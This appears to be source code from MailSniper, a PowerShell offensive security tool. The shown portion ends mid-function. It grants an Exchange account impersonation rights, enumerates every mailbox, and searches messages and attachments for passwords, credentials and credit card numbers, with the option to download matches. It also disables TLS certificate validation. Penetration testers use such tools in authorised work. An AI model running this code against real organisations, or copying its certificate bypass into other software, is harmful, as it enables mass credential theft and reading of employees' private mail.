function Invoke-GlobalMailSearch{
<#
  .SYNOPSIS

    This module will connect to a Microsoft Exchange server and grant the "ApplicationImpersonation" role to a specified user. Having the "ApplicationImpersonation" role allows that user to search through other domain user's mailboxes. After this role has been granted the Invoke-GlobalSearchFunction creates a list of all mailboxes in the Exchange database. The module then connects to Exchange Web Services using the impersonation role to gather a number of emails from each mailbox, and ultimately searches through them for specific terms.

    MailSniper Function: Invoke-GlobalMailSearch
    Author: Beau Bullock (@dafthack)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

  .DESCRIPTION

    This module will connect to a Microsoft Exchange server and grant the "ApplicationImpersonation" role to a specified user. Having the "ApplicationImpersonation" role allows that user to search through other domain user's mailboxes. After this role has been granted the Invoke-GlobalMailSearch function creates a list of all mailboxes in the Exchange database. The module then connects to Exchange Web Services using the impersonation role to gather a number of emails from each mailbox, and ultimately searches through them for specific terms.

  .PARAMETER ImpersonationAccount

    Username of the current user account the PowerShell process is running as. This user will be granted the ApplicationImpersonation role on Exchange.

  .PARAMETER ExchHostname

    The hostname of the Exchange server to connect to.

  .PARAMETER AdminUserName

    The username of an Exchange administrator (i.e. member of "Exchange Organization Administrators" or "Organization Management" group) including the domain (i.e. domain\adminusername).

  .PARAMETER AdminPassword

    The Password to the Exchange administrator (i.e. member of "Exchange Organization Administrators" or "Organization Management" group) account specified with AdminUserName.

  .PARAMETER AutoDiscoverEmail

    A valid email address that will be used to autodiscover where the Exchange server is located.

  .PARAMETER MailsPerUser

    The total number of emails to return for each mailbox.

  .PARAMETER Terms

    Certain terms to search through each email subject and body for. By default the script looks for "*password*","*creds*","*credentials*"

  .PARAMETER OutputCsv

    Outputs the results of the search to a CSV file.

  .PARAMETER ExchangeVersion

    In order to communicate with Exchange Web Services the correct version of Microsoft Exchange Server must be specified. By default this script tries "Exchange2010". Additional options to try are  Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013, or Exchange2013_SP1.

  .PARAMETER EmailList

    A text file listing email addresses to search (one per line).

  .PARAMETER Folder

    The folder of each mailbox to search. By default the script only searches the "Inbox" folder. By specifying 'all' for the Folder option all of the folders including subfolders of the specified mailbox will be searched.

  .PARAMETER Regex

    The regex parameter allows for the use of regular expressions when doing searches. This will override the -Terms flag. 

  .PARAMETER CheckAttachments

    If the CheckAttachments option is added MailSniper will attempt to search through the contents of email attachements in addition to the default body/subject. These attachments can be downloaded by specifying the -DownloadDir option. It only searches attachments that are of extension .txt, .htm, .pdf, .ps1, .doc, .xls, .bat, and .msg currently.

  .PARAMETER DownloadDir

    When the CheckAttachments option finds attachments that are matches to the search terms the files can be downloaded to a specific location using the -DownloadDir option. 


  .EXAMPLE

    C:\PS> Invoke-GlobalMailSearch -ImpersonationAccount current-username -ExchHostname Exch01 -OutputCsv global-email-search.csv

    Description
    -----------
    This command will connect to the Exchange server located at 'Exch01' and prompt for administrative credentials. Once administrative credentials have been entered a PS remoting session is setup to the Exchange server where the ApplicationImpersonation role is then granted to the "current-username" user. A list of all email addresses in the domain is then gathered, followed by a connection to Exchange Web Services as "current-username" where by default 100 of the latest emails from each mailbox will be searched through for the terms "*pass*","*creds*","*credentials*" and output to a CSV called global-email-search.csv.

  .EXAMPLE

    C:\PS> Invoke-GlobalMailSearch -ImpersonationAccount current-username -AutoDiscoverEmail user@domain.com -MailsPerUser 2000 -Terms "*passwords*","*super secret*","*industrial control systems*","*scada*","*launch codes*"

    Description
    -----------
    This command will connect to the Exchange server autodiscovered from the email address entered, and prompt for administrative credentials. Once administrative credentials have been entered a PS remoting session is setup to the Exchange server where the ApplicationImpersonation role is then granted to the "current-username" user. A list of all email addresses in the domain is then gathered, followed by a connection to Exchange Web Services as "current-username" where 2000 of the latest emails from each mailbox will be searched through for the terms "*passwords*","*super secret*","*industrial control systems*","*scada*","*launch codes*".

  .EXAMPLE

    C:\PS> Invoke-GlobalMailSearch -ImpersonationAccount current-username -ExchHostname Exch01 -AdminUserName domain\exchangeadminuser -AdminPassword Summer123 -ExchangeVersion Exchange2010 -OutputCsv global-email-search.csv

    Description
    -----------
    This command will connect to the Exchange server located at 'Exch01' and use the Exchange admin username and password specified in the command line. A PS remoting session is setup to the Exchange server where the ApplicationImpersonation role is then granted to the "current-username" user. A list of all email addresses in the domain is then gathered, followed by a connection to Exchange Web Services using an Exchange Version of Exchange2010 as "current-username" where by default 100 of the latest emails from each mailbox will be searched through for the terms "*pass*","*creds*","*credentials*" and output to a CSV called global-email-search.csv.

  .EXAMPLE

    C:\PS> Invoke-GlobalMailSearch -ImpersonationAccount current-username -AutoDiscoverEmail user@domain.com -Folder all

    Description
    -----------
    This command will connect to the Exchange server autodiscovered from the email address entered, and prompt for administrative credentials. Once administrative credentials have been entered a PS remoting session is setup to the Exchange server where the ApplicationImpersonation role is then granted to the "current-username" user. A list of all email addresses in the domain is then gathered, followed by a connection to Exchange Web Services as "current-username" where 100 of the latest emails from each folder including subfolders in each mailbox will be searched through for the terms "*passwords*","*super secret*","*industrial control systems*","*scada*","*launch codes*".

  .EXAMPLE

    C:\PS> Invoke-GlobalMailSearch -ImpersonationAccount current-username -AutoDiscoverEmail current-user@domain.com -Regex '.*3[47][0-9]{13}.*|.*(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}.*|.*4[0-9]{12}(?:[0-9]{3}).*'

    Description
    -----------
    This command will utilize a Regex search instead of the standard Terms functionality. Specifically, the regular expression in the example above will attempt to match on valid VISA, Mastercard, and American Express credit card numbers in the body and subject's of emails.

  .EXAMPLE

    C:\PS> Invoke-GlobalMailSearch -ImpersonationAccount current-username -AutoDiscoverEmail current-user@domain.com -CheckAttachments -DownloadDir C:\temp

    Description
    -----------
    This command will search through all of the attachments to emails as well as the default body/subject for specific terms and download any attachments found to the C:\temp directory.
#>


  Param
  (
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $ImpersonationAccount = "",

    [Parameter(Position = 1, Mandatory = $false)]
    [string]
    $AutoDiscoverEmail = "",

    [Parameter(Position = 2, Mandatory = $false)]
    [system.URI]
    $ExchHostname = "",

    [Parameter(Position = 3, Mandatory = $false)]
    [string]
    $AdminUserName = "",

    [Parameter(Position = 4, Mandatory = $false)]
    [string]
    $AdminPassword = "",

    [Parameter(Position = 5, Mandatory = $False)]
    [string[]]$Terms = ("*password*","*creds*","*credentials*"),

    [Parameter(Position = 6, Mandatory = $False)]
    [int]
    $MailsPerUser = 100,

    [Parameter(Position = 7, Mandatory = $False)]
    [string]
    $OutputCsv = "",

    [Parameter(Position = 8, Mandatory = $False)]
    [string]
    $ExchangeVersion = "Exchange2010",

    [Parameter(Position = 9, Mandatory = $False)]
    [string]
    $EmailList = "",

    [Parameter(Position = 10, Mandatory = $False)]
    [string]
    $Folder = "Inbox",

    [Parameter(Position = 11, Mandatory = $False)]
    [string]
    $Regex = '',

    [Parameter(Position = 12, Mandatory = $False)]
    [switch]
    $CheckAttachments,

    [Parameter(Position = 13, Mandatory = $False)]
    [string]
    $DownloadDir = ""
  )

  #Check for a method of connecting to the Exchange Server
  if (($ExchHostname -ne "") -Or ($AutoDiscoverEmail -ne ""))
  {
    Write-Output ""
  }
  else
  {
    Write-Output "[*] Either the option 'ExchHostname' or 'AutoDiscoverEmail' must be entered!"
    break
  }

  #Running the LoadEWSDLL function to load the required Exchange Web Services dll
  LoadEWSDLL

  #The specific version of Exchange must be specified
  Write-Output "[*] Trying Exchange version $ExchangeVersion"
  $ServiceExchangeVersion = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::$ExchangeVersion
  $service = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService($ServiceExchangeVersion)

  #Using current user's credentials to connect to EWS
  $service.UseDefaultCredentials = $true

  ## Choose to ignore any SSL Warning issues caused by Self Signed Certificates      
  ## Code From http://poshcode.org/624

  ## Create a compilation environment
  $Provider=New-Object Microsoft.CSharp.CSharpCodeProvider
  $Compiler=$Provider.CreateCompiler()
  $Params=New-Object System.CodeDom.Compiler.CompilerParameters
  $Params.GenerateExecutable=$False
  $Params.GenerateInMemory=$True
  $Params.IncludeDebugInformation=$False
  $Params.ReferencedAssemblies.Add("System.DLL") > $null

$TASource=@'
  namespace Local.ToolkitExtensions.Net.CertificatePolicy {
    public class TrustAll : System.Net.ICertificatePolicy {
      public TrustAll() { 
      }
      public bool CheckValidationResult(System.Net.ServicePoint sp,
        System.Security.Cryptography.X509Certificates.X509Certificate cert, 
        System.Net.WebRequest req, int problem) {
        return true;
      }
    }
  }
'@ 
  $TAResults=$Provider.CompileAssemblyFromSource($Params,$TASource)
  $TAAssembly=$TAResults.CompiledAssembly

  ## We now create an instance of the TrustAll and attach it to the ServicePointManager
  $TrustAll=$TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
  [System.Net.ServicePointManager]::CertificatePolicy=$TrustAll
  
  ## end code from http://poshcode.org/624

  #Connect to remote Exchange Server and add Impersonation Role to a user account
  #Set the Exchange URI for the PS-Remoting session
  If($AutoDiscoverEmail -ne "")
  {
    ("[*] Autodiscovering email server for " + $AutoDiscoverEmail + "...")
    $service.AutoDiscoverUrl($AutoDiscoverEmail, {$true})
    $ExchUri = New-Object System.Uri(("http://" + $service.Url.Host + "/PowerShell"))
  }
  else
  {
    $ExchUri = New-Object System.Uri(("http://" + $ExchHostname + "/PowerShell/"))
  }

  #If the Exchange admin credentials were passed to the command line use those else prompt for Exchange admin credentials.
  if ($AdminPassword -ne "")
  {
    $password = $AdminPassword | ConvertTo-SecureString -asPlainText -Force
    $Login = New-Object System.Management.Automation.PSCredential($AdminUserName,$password)
  }
  else
  {
    Write-Host "[*] Enter Exchange admin credentials to add your user to the impersonation role"
    $Login = Get-Credential
  }

  #PowerShell Remoting to Remote Exchange Server, Import Exchange Management Shell Tools
  try
  {
    $Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri $ExchUri -Authentication Kerberos -Credential $Login -ErrorAction Stop -verbose:$false
  }
  catch
  {
    $ErrorMessage = $_.Exception.Message
    if ($ErrorMessage -like "*Logon failure*")
    {
      Write-Host -foregroundcolor "red" "[*] ERROR: Logon failure. Ensure you have entered the correct credentials including the domain (i.e domain\username)."
      break
    }
    Write-Host -foregroundcolor "red" "$ErrorMessage"
    break
  }
  
  if($AutoDiscoverEmail -ne "")
  {
    Write-Output ("[*] Attempting to establish a PowerShell session to http://" + $service.Url.Host + "/PowerShell with provided credentials.")
    try
    {
      Import-PSSession $Session -DisableNameChecking -AllowClobber -verbose:$false | Out-Null
    }
    catch
    {
    Write-host -foregroundcolor "red" ("[*] ERROR: Failed to connect to Exchange server at " + $service.Url.Host + ". Check server name.")
    break
    } 
  }
  else
  {
    Write-Output ("[*] Attempting to establish a PowerShell session to http://" + $ExchHostname + "/PowerShell with provided credentials.")
    try
    {
      Import-PSSession $Session -DisableNameChecking -AllowClobber -verbose:$false | Out-Null
    }
    catch
    {
      Write-Host -foregroundcolor "red" "[*] ERROR: Failed to connect to Exchange server at $ExchHostname. Check server name."
      break
  }
  }
  

  #Allow user to impersonate other users
  Write-Output "[*] Now granting the $ImpersonationAccount user ApplicationImpersonation rights!"
  $ImpersonationAssignmentName = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
  New-ManagementRoleAssignment -Name:$ImpersonationAssignmentName -Role:ApplicationImpersonation -User:$ImpersonationAccount | Out-Null

  #Get a list of all mailboxes
  if($EmailList -ne "")
  {
    $AllMailboxes = Get-Content -Path $EmailList
    Write-Host "[*] The total number of mailboxes discovered is: " $AllMailboxes.count
  }
  else 
  {
    $SMTPAddresses = Get-Mailbox -ResultSize unlimited | Select Name -ExpandProperty PrimarySmtpAddress
    $AllMailboxes = $SMTPAddresses -replace ".*:"
    Write-Host "[*] The total number of mailboxes discovered is: " $AllMailboxes.count
  }
  
  #Set the Exchange Web Services URL 
  if ($ExchHostname -ne "")
  {
    ("[*] Using EWS URL " + "https://" + $ExchHostname + "/EWS/Exchange.asmx")
    $service.Url = new-object System.Uri(("https://" + $ExchHostname + "/EWS/Exchange.asmx"))
  }
  else
  {
    ("[*] Using EWS URL " + "https://"  + $service.Url.Host + "/EWS/Exchange.asmx")
    $service.AutoDiscoverUrl($AutoDiscoverEmail, {$true})
  }   
 
  Write-Host -foregroundcolor "yellow" "`r`n[*] Now connecting to EWS to search the mailboxes!`r`n"
 
  #Search function searches through each mailbox one at a time
  ForEach($Mailbox in $AllMailboxes)
  {
    $i++
        Write-Host -NoNewLine ("[" + $i + "/" + $AllMailboxes.count + "]") -foregroundcolor "yellow"; Write-Output (" Using " + $ImpersonationAccount + " to impersonate " + $Mailbox)
    $service.ImpersonatedUserId = New-Object Microsoft.Exchange.WebServices.Data.ImpersonatedUserId([Microsoft.Exchange.WebServices.Data.ConnectingIdType]::SmtpAddress,$Mailbox ); 
    $rootFolder = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service,'MsgFolderRoot')
    $folderView = [Microsoft.Exchange.WebServices.Data.FolderView]100
    $folderView.Traversal='Deep'
    $rootFolder.Load()
    if ($Folder -ne "all")
    {
      $CustomFolderObj = $rootFolder.FindFolders($folderView) | Where-Object { $_.DisplayName -eq $Folder }
    }
    else
    {
      $CustomFolderObj = $rootFolder.FindFolders($folderView) 
    }
    $PostSearchList = @() 
    Foreach($foldername in $CustomFolderObj)
    {
        Write-Output "[***] Found folder: $($foldername.DisplayName)"
    
      try
      {
        $Inbox = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service,$foldername.Id)
      }
      catch
      {
        $ErrorMessage = $_.Exception.Message
        if ($ErrorMessage -like "*Exchange Server doesn't support the requested version.*")
        {
          Write-Output "[*] ERROR: The connection to Exchange failed using Exchange Version $ExchangeVersion."
          Write-Output "[*] Try setting the -ExchangeVersion flag to the Exchange version of the server."
          Write-Output "[*] Some options to try: Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013, or Exchange2013_SP1."
          break
        }
      }


      $PropertySet = New-Object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties)
      $PropertySet.RequestedBodyType = [Microsoft.Exchange.WebServices.Data.BodyType]::Text
     
   
    try 
    {
      $mails = $Inbox.FindItems($MailsPerUser)
    }
    catch [Exception]{
      Write-Host -foregroundcolor "red" ("[*] Warning: " + $Mailbox + " does not appear to have a mailbox.")
      continue
    }   
      if ($regex -eq "")
      {
        Write-Output ("[*] Now searching mailbox: $Mailbox for the terms $Terms.")
      }
      else 
      {
        Write-Output ("[*] Now searching the mailbox: $Mailbox with the supplied regular expression.")    
      }

      foreach ($item in $mails.Items)
      {    
        $item.Load($PropertySet)
        if ($Regex -eq "")
        {
          foreach($specificterm in $Terms)
          {
            if ($item.Body.Text -like $specificterm)
            {
            $PostSearchList += $item
            }
            elseif ($item.Subject -like $specificterm)
            {
            $PostSearchList += $item
            }
          }
        }
        else 
        {
          foreach($regularexpresion in $Regex)
          {
            if ($item.Body.Text -match $regularexpresion)
            {
            $PostSearchList += $item
            }
            elseif ($item.Subject -match $regularexpresion)
            {
            $PostSearchList += $item
            }
          }    
        }
        if ($CheckAttachments)
        {
          foreach($attachment in $item.Attachments)
          {
            if($attachment -is [Microsoft.Exchange.WebServices.Data.FileAttachment])
            {
              if($attachment.Name.Contains(".txt") -Or $attachment.Name.Contains(".htm") -Or $attachment.Name.Contains(".pdf") -Or $attachment.Name.Contains(".ps1") -Or $attachment.Name.Contains(".doc") -Or $attachment.Name.Contains(".xls") -Or $attachment.Name.Contains(".bat") -Or $attachment.Name.Contains(".msg"))
              {
                $attachment.Load() | Out-Null
                $plaintext = [System.Text.Encoding]::ASCII.GetString($attachment.Content)
                if ($Regex -eq "")
                {
                  foreach($specificterm in $Terms)
                  {
                    if ($plaintext -like $specificterm)
                    {
                      Write-Output ("Found attachment " + $attachment.Name)
                      $PostSearchList += $item
                      if ($DownloadDir -ne "")
                      { 
                        $prefix = Get-Random
                        $DownloadFile = new-object System.IO.FileStream(($DownloadDir + "\" + $prefix + "-" + $attachment.Name.ToString()), [System.IO.FileMode]::Create)
                        $DownloadFile.Write($attachment.Content, 0, $attachment.Content.Length)
                        $DownloadFile.Close()
                      }
                    }
                    elseif ($plaintext -like $specificterm)
                    {
                      Write-Output ("Found attachment " + $attachment.Name)
                      $PostSearchList += $item
                      if ($DownloadDir -ne "")
                      { 
                        $prefix = Get-Random
                        $DownloadFile = new-object System.IO.FileStream(($DownloadDir + "\" + $prefix + $attachment.Name.ToString()), [System.IO.FileMode]::Create)
                        $DownloadFile.Write($attachment.Content, 0, $attachment.Content.Length)
                        $DownloadFile.Close()
                      }
                    }
                  }
                }
                else 
                {
                  foreach($regularexpresion in $Regex)
                  {
                    if ($plaintext -match $regularexpresion)
                    {
                    Write-Output ("Found attachment " + $attachment.Name)
                    $PostSearchList += $item
                      if ($DownloadDir -ne "")
                      { 
                        $prefix = Get-Random
                        $DownloadFile = new-object System.IO.FileStream(($DownloadDir + "\" + $prefix + $attachment.Name.ToString()), [System.IO.FileMode]::Create)
                        $DownloadFile.Write($attachment.Content, 0, $attachment.Content.Length)
                        $DownloadFile.Close()
                      }
                    }
                    elseif ($plaintext -match $regularexpresion)
                    {
                    Write-Output ("Found attachment " + $attachment.Name)
                    $PostSearchList += $item
                      if ($DownloadDir -ne "")
                      { 
                        $prefix = Get-Random
                        $DownloadFile = new-object System.IO.FileStream(($DownloadDir + "\" + $prefix + $attachment.Name.ToString()), [System.IO.FileMode]::Create)
                        $DownloadFile.Write($attachment.Content, 0, $attachment.Content.Length)
                        $DownloadFile.Close()
                      }
                    }
                  }    
                }
              }
            }
          }
        }
      }

    }
       
    if ($OutputCsv -ne "")
    { 
      $PostSearchList | %{ $_.Body = $_.Body -replace "`r`n",'\n' -replace ",",'&#44;'}
      $PostSearchList | Select-Object Sender,ReceivedBy,Subject,Body | Export-Csv "temp-$OutputCsv" -encoding "UTF8"
        if ("temp-$OutputCsv")
        {
          Import-Csv "temp-$OutputCsv" | ConvertTo-Csv -NoTypeInformation | Select-Object -Skip 1 | Out-File -Encoding ascii -Append $OutputCsv
          Remove-Item "temp-$OutputCsv"
        }
    }
    else
    {
      $PostSearchList | ft -Property Sender,ReceivedBy,Subject,Body | Out-String
    }
  }
  
  if ($OutputCsv -ne "")
  {
    $filedata = Import-Csv $OutputCsv -Header Sender , ReceivedBy , Subject , Body
    $filedata | Export-Csv $OutputCsv -NoTypeInformation
    Write-Host -foregroundcolor "yellow" "`r`n[*] Results have been output to $OutputCsv"
  }
  #Remove User from impersonation role
  Write-Output "`r`n[*] Removing ApplicationImpersonation role from $ImpersonationAccount."
  Get-ManagementRoleAssignment -RoleAssignee $ImpersonationAccount -Role ApplicationImpersonation -RoleAssigneeType user | Remove-ManagementRoleAssignment -confirm:$fals

}

function Invoke-SelfSearch{

<#
  .SYNOPSIS

    This module will connect to a Microsoft Exchange server using Exchange Web Services to gather a number of emails from the current user's mailbox. It then searches through them for specific terms.

    MailSniper Function: Invoke-SelfSearch
    Author: Beau Bullock (@dafthack)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

  .DESCRIPTION

    This module will connect to a Microsoft Exchange server using Exchange Web Services to gather a number of emails from the current user's mailbox. It then searches through them for specific terms.

  .PARAMETER ExchHostname

    The hostname of the Exchange server to connect to.

  .PARAMETER Mailbox

    Email address of the current user the PowerShell process is running as.

  .PARAMETER Terms

    Certain terms to search through each email subject and body for. By default the script looks for "*password*","*creds*","*credentials*"

  .PARAMETER ExchangeVersion

    In order to communicate with Exchange Web Services the correct version of Microsoft Exchange Server must be specified. By default this script tries "Exchange2010". Additional options to try are  Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013, or Exchange2013_SP1.
  
  .PARAMETER OutputCsv

    Outputs the results of the search to a CSV file.

  .PARAMETER MailsPerUser

    The total number of emails to return for each mailbox.

  .PARAMETER Remote

    A switch for performing the search remotely across the Internet against a system hosting EWS. Instead of utilizing the current user's credentials if the -Remote option is added a new credential box will pop up for accessing the remote EWS service. 
  
  .PARAMETER Folder

    The folder of each mailbox to search. By default the script only searches the "Inbox" folder. By specifying 'all' for the Folder option all of the folders including subfolders of the specified mailbox will be searched.

  .PARAMETER Regex

    The regex parameter allows for the use of regular expressions when doing searches. This will override the -Terms flag. 

  .PARAMETER CheckAttachments

    If the CheckAttachments option is added MailSniper will attempt to search through the contents of email attachements in addition to the default body/subject. These attachments can be downloaded by specifying the -DownloadDir option. It only searches attachments that are of extension .txt, .htm, .pdf, .ps1, .doc, .xls, .bat, and .msg currently.

  .PARAMETER DownloadDir

    When the CheckAttachments option finds attachments that are matches to the search terms the files can be downloaded to a specific location using the -DownloadDir option.
      

  .EXAMPLE

    C:\PS> Invoke-SelfSearch -Mailbox current-user@domain.com 

    Description
    -----------
    This command will connect to the Exchange server autodiscovered from the email address entered using Exchange Web Services where by default 100 of the latest emails from the "Mailbox" will be searched through for the terms "*pass*","*creds*","*credentials*".

  .EXAMPLE

    C:\PS> Invoke-SelfSearch -Mailbox current-user@domain.com -ExchHostname -MailsPerUser 2000 -Terms "*passwords*","*super secret*","*industrial control systems*","*scada*","*launch codes*"

    Description
    -----------
    This command will connect to the Exchange server entered as "ExchHostname" followed by a connection to Exchange Web Services as where 2000 of the latest emails from the "Mailbox" will be searched through for the terms "*passwords*","*super secret*","*industrial control systems*","*scada*","*launch codes*".
  
  .EXAMPLE

    C:\PS> Invoke-SelfSearch -Mailbox current-user@domain.com -ExchHostname mail.domain.com -OutputCsv mails.csv -Remote

    Description
    -----------
    This command will connect to the remote Exchange server specified with -ExchHostname using Exchange Web Services where by default 100 of the latest emails from the "Mailbox" will be searched through for the terms "*pass*","*creds*","*credentials*". Since the -Remote flag was passed a new credential box will popup asking for the user's credentials to authenticate to the remote EWS. The username should be the user's domain login (i.e. domain\username) but depending on how internal UPN's were setup it might accept the user's email address (i.e. user@domain.com).

  .EXAMPLE

    C:\PS> Invoke-SelfSearch -Mailbox current-user@domain.com -Regex '.*3[47][0-9]{13}.*|.*(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}.*|.*4[0-9]{12}(?:[0-9]{3}).*'

    Description
    -----------
    This command will utilize a Regex search instead of the standard Terms functionality. Specifically, the regular expression in the example above will attempt to match on valid VISA, Mastercard, and American Express credit card numbers in the body and subject's of emails.
  
  .EXAMPLE

    C:\PS> Invoke-SelfSearch -Mailbox current-user@domain.com -Folder all

    Description
    -----------
    This command will connect to the Exchange server autodiscovered from the email address entered using Exchange Web Services where by default 100 of the latest emails in all of the folders including subfolders from the "Mailbox" will be searched through for the terms "*pass*","*creds*","*credentials*".

  .EXAMPLE

    C:\PS> Invoke-SelfSearch -Mailbox current-user@domain.com -CheckAttachments -DownloadDir C:\temp

    Description
    -----------
    This command will search through all of the attachments to emails as well as the default body/subject for specific terms and download any attachments found to the C:\temp directory.

#>
  Param(

    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $Mailbox = "",

    [Parameter(Position = 1, Mandatory = $false)]
    [system.URI]
    $ExchHostname = "",

    [Parameter(Position = 2, Mandatory = $False)]
    [string[]]$Terms = ("*password*","*creds*","*credentials*"),

    [Parameter(Position = 3, Mandatory = $False)]
    [int]
    $MailsPerUser = 100,

    [Parameter(Position = 4, Mandatory = $False)]
    [string]
    $OutputCsv = "",

    [Parameter(Position = 5, Mandatory = $False)]
    [string]
    $ExchangeVersion = "Exchange2010",

    [Parameter(Position = 6, Mandatory = $False)]
    [switch]
    $Remote,

    [Parameter(Position = 7, Mandatory = $False)]
    [string]
    $Folder = 'Inbox',

    [Parameter(Position = 8, Mandatory = $False)]
    [string]
    $Regex = '',

    [Parameter(Position = 9, Mandatory = $False)]
    [switch]
    $CheckAttachments,

    [Parameter(Position = 10, Mandatory = $False)]
    [string]
    $DownloadDir = "",

    [Parameter(Position = 11, Mandatory = $False)]
    [switch]
    $OtherUserMailbox

  )
  #Running the LoadEWSDLL function to load the required Exchange Web Services dll
  LoadEWSDLL

  Write-Output "[*] Trying Exchange version $ExchangeVersion"
  $ServiceExchangeVersion = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::$ExchangeVersion

  $service = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService($ServiceExchangeVersion)

  #If the -Remote flag was passed prompt for the user's domain credentials.
  if ($Remote)
  {
    $remotecred = Get-Credential
    $service.UseDefaultCredentials = $false
    $service.Credentials = $remotecred.GetNetworkCredential()
  }
  else
  {
    #Using current user's credentials to connect to EWS
    $service.UseDefaultCredentials = $true
  }

  ## Choose to ignore any SSL Warning issues caused by Self Signed Certificates     
  ## Code From http://poshcode.org/624

  ## Create a compilation environment
  $Provider=New-Object Microsoft.CSharp.CSharpCodeProvider
  $Compiler=$Provider.CreateCompiler()
  $Params=New-Object System.CodeDom.Compiler.CompilerParameters
  $Params.GenerateExecutable=$False
  $Params.GenerateInMemory=$True
  $Params.IncludeDebugInformation=$False
  $Params.ReferencedAssemblies.Add("System.DLL") > $null

  $TASource=@'
    namespace Local.ToolkitExtensions.Net.CertificatePolicy{
      public class TrustAll : System.Net.ICertificatePolicy {
        public TrustAll() { 
        }
        public bool CheckValidationResult(System.Net.ServicePoint sp,
          System.Security.Cryptography.X509Certificates.X509Certificate cert, 
          System.Net.WebRequest req, int problem) {
          return true;
        }
      }
    }
'@ 
  $TAResults=$Provider.CompileAssemblyFromSource($Params,$TASource)
  $TAAssembly=$TAResults.CompiledAssembly

  ## We now create an instance of the TrustAll and attach it to the ServicePointManager
  $TrustAll=$TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
  [System.Net.ServicePointManager]::CertificatePolicy=$TrustAll

  ## end code from http://poshcode.org/624
    
  if ($ExchHostname -ne "")
  {
    ("[*] Using EWS URL " + "https://" + $ExchHostname + "/EWS/Exchange.asmx")
    $service.Url = new-object System.Uri(("https://" + $ExchHostname + "/EWS/Exchange.asmx"))
  }
  else
  {
    ("[*] Autodiscovering email server for " + $Mailbox + "...")
    $service.AutoDiscoverUrl($Mailbox, {$true})
  }    

    if($OtherUserMailbox)
    {
        $msgfolderroot = New-Object Microsoft.Exchange.WebServices.Data.FolderId([Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox,$Mailbox)
        $Inbox = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service,$msgfolderroot)
        $ItemView = New-Object Microsoft.Exchange.WebServices.Data.ItemView(1)
        $Item = $service.FindItems($Inbox.Id,$ItemView)  

    }
    else
    {
        $msgfolderroot = [Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::MsgFolderRoot
        $mbx = New-Object Microsoft.Exchange.WebServices.Data.Mailbox( $Mailbox )
        $FolderId = New-Object Microsoft.Exchange.WebServices.Data.FolderId( $msgfolderroot, $mbx)  
        $rootFolder = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service,$FolderId)
        $folderView = [Microsoft.Exchange.WebServices.Data.FolderView]100
        $folderView.Traversal='Deep'
        $rootFolder.Load()
        if ($Folder -ne "all")
        {
          $CustomFolderObj = $rootFolder.FindFolders($folderView) | Where-Object { $_.DisplayName -eq $Folder }
        }
        else
        {
          $CustomFolderObj = $rootFolder.FindFolders($folderView) 
        }
    }

    $PostSearchList = @() 
    
    if($OtherUserMailbox)
    {
         
      $PropertySet = New-Object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties)
      $PropertySet.RequestedBodyType = [Microsoft.Exchange.WebServices.Data.BodyType]::Text
     
      $mails = $Inbox.FindItems($MailsPerUser)   
      
      if ($regex -eq "")
      {
        Write-Output ("[*] Now searching mailbox: $Mailbox for the terms $Terms.")
      }
      else 
      {
        Write-Output ("[*] Now searching the mailbox: $Mailbox with the supplied regular expression.")    
      }

      foreach ($item in $mails.Items)
      {    
        $item.Load($PropertySet)
        if ($Regex -eq "")
        {
          foreach($specificterm in $Terms)
          {
            if ($item.Body.Text -like $specificterm)
            {
            $PostSearchList += $item
            }
            elseif ($item.Subject -like $specificterm)
            {
            $PostSearchList += $item
            }
          }
        }
        else 
        {
          foreach($regularexpresion in $Regex)
          {
            if ($item.Body.Text -match $regularexpresion)
            {
            $PostSearchList += $item
            }
            elseif ($item.Subject -match $regularexpresion)
            {
            $PostSearchList += $item
            }
          }    
        }
        if ($CheckAttachments)
        {
          foreach($attachment in $item.Attachments)
          {
            if($attachment -is [Microsoft.Exchange.WebServices.Data.FileAttachment])
            {
              if($attachment.Name.Contains(".txt") -Or $attachment.Name.Contains(".htm") -Or $attachment.Name.Contains(".pdf") -Or $attachment.Name.Contains(".ps1") -Or $attachment.Name.Contains(".doc") -Or $attachment.Name.Contains(".xls") -Or $attachment.Name.Contains(".bat") -Or $attachment.Name.Contains(".msg"))
              {
                $attachment.Load() | Out-Null
                $plaintext = [System.Text.Encoding]::ASCII.GetString($attachment.Content)
                if ($Regex -eq "")
                {
                  foreach($specificterm in $Terms)
                  {
                    if ($plaintext -like $specificterm)
                    {
                      Write-Output ("Found attachment " + $attachment.Name)
                      $PostSearchList += $item
                      if ($DownloadDir -ne "")
                      { 
                        $prefix = Get-Random
                        $DownloadFile = new-object System.IO.FileStream(($DownloadDir + "\" + $prefix + "-" + $attachment.Name.ToString()), [System.IO.FileMode]::Create)
                        $DownloadFile.Write($attachment.Content, 0, $attachment.Content.Length)
                        $DownloadFile.Close()
                      }
                    }
                    elseif ($plaintext -like $specificterm)
                    {
